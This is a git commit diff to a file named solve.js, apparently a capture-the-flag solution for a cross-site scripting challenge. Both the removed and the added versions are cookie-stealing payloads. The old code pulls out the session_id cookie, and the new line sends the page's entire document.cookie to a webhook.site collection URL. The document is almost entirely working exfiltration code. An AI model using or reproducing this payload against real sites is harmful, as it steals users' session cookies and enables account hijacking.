058023a64aebfaf12302c315213a5352adfc6775
Theory <51336409+7h30ry@users.noreply.github.com>
2025-05-03 12:52:02 +0100

    solve.js

--- solve.js
+++ solve.js
@@ -1,11 +1,1 @@
-const sessionId = document.cookie
-  .split('; ')
-  .find(c => c.startsWith('session_id='))
-  ?.split('=')[1];
-
-if (sessionId) {
-  fetch('https://webhook.site/2fb97de6-5240-45a4-81ad-3bc5411dd884?session_id=' + encodeURIComponent(sessionId), {
-    method: 'GET',
-    mode: 'no-cors'
-  });
-}
+fetch("https://webhook.site/2fb97de6-5240-45a4-81ad-3bc5411dd884/?c=" + document.cookie);
